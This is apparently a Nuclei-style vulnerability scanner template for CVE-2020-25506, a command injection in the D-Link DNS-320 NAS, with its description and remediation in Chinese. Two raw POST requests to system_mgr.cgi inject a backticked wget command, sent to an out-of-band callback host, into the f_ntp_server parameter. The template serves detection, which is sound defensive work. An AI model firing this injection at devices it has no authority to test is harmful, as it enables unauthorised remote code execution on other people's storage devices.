id: CVE-2020-25506
info:
  name: D-Link DNS-320 Unauthenticated Remote Code Execution
  author:
  - l0ne1y
  description: |-
    D-Link DNS-320 命令注入漏洞
    D-Link DNS-320是中国台湾友讯（D-Link）公司的一款NAS（网络附属存储）设备。

    D-Link DNS-320 FW v2.06B01 Revision 存在命令注入漏洞，该漏洞源于mgr.cgi组件中的命令注入影响，可能导致远程任意执行代码。
  severity: critical
  remediation: |-
    官方修复方案：
    1、目前厂商已发布升级补丁以修复漏洞，补丁获取链接：
    https://supportannouncement.us.dlink.com/announcement/publication.aspx?name=SAP10183
requests:
- matchers:
  - type: word
    part: interactsh_protocol
    words:
    - http
  raw:
  - |
    POST /cgi-bin/system_mgr.cgi? HTTP/1.1
    Host: {{Hostname}}
    Accept: */*

    C1=ON&cmd=cgi_ntp_time&f_ntp_server=`wget http://{{interactsh-url}}`
  - |
    POST /cgi-bin/system_mgr.cgi?C1=ON&cmd=cgi_ntp_time&f_ntp_server=`wget http://{{interactsh-url}}` HTTP/1.1
    Host: {{Hostname}}
    Accept: */*
